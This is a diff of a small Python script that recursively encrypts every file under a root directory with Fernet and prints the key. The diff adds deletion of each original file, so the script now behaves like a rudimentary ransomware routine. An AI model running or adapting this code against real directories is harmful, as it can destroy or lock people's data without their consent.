@@ -1,7 +1,7 @@
 import os
 from cryptography.fernet import Fernet
 
-rootDir = '/Users/kakao'
+rootDir = '/test'
 
 # Initialize an empty list to store the file names
 file_list = []
@@ -34,14 +34,15 @@ for name in file_list:
 
 # Encrypt the file data
     encrypted_data = fernet.encrypt(file_data)
-
+    new_name = name + '_enc.txt'
 # Write the encrypted data to a new file
-    encrypted_file = open('encrypted_file.txt', 'wb')
+    encrypted_file = open(new_name, 'wb')
     encrypted_file.write(encrypted_data)
 
 # Close the files
     file_to_encrypt.close()
     encrypted_file.close()
+    os.remove(name)
 
 # Print the key
 print('Encryption key:', key)
